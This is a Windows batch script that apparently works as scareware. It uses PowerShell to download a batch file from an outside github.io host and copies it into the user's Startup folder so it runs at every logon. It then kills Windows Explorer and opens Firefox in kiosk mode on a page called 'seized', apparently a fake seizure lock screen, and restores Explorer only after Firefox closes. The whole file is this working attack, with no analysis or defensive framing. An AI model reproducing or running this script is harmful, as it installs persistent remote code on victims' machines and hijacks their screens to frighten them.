@echo off
:: Set variables
set "url=https://giggityfiles.github.io/szz.bat"
set "file=%temp%\szz.bat"
set "startup=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\szz.bat"
set "log=%userprofile%\szz_log.txt"

echo ====== Script Started: %date% %time% ====== >> "%log%"

:: Download szz.bat
echo [%time%] Downloading szz.bat... >> "%log%"
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"

if exist "%file%" (
    echo [%time%] Download succeeded. >> "%log%"
    echo Copying to Startup folder...
    copy "%file%" "%startup%" /Y >> "%log%"
    echo [%time%] Copied to Startup folder. >> "%log%"
) else (
    echo [%time%] Download failed. Check URL or network. >> "%log%"
    echo Download failed. Check your connection or the URL.
    pause
    exit
)

:: Kill Explorer
echo Killing Explorer...
echo [%time%] Killing Explorer... >> "%log%"
taskkill /f /im explorer.exe >> "%log%" 2>&1

:: Launch Firefox in kiosk mode
echo Launching Firefox...
echo [%time%] Launching Firefox in kiosk mode. >> "%log%"
start firefox --kiosk https://giggityfiles.github.io/seized

:: Wait for Firefox to close
echo Waiting for Firefox to close...
echo [%time%] Waiting for Firefox to close. >> "%log%"
:waitloop
timeout /t 2 >nul
tasklist | find /i "firefox.exe" >nul
if not errorlevel 1 goto waitloop

:: Restart Explorer
echo Restarting Explorer...
echo [%time%] Restarting Explorer. >> "%log%"
start explorer.exe >> "%log%" 2>&1

echo [%time%] Script completed successfully. >> "%log%"
echo Log saved to: %log%
pause
exit
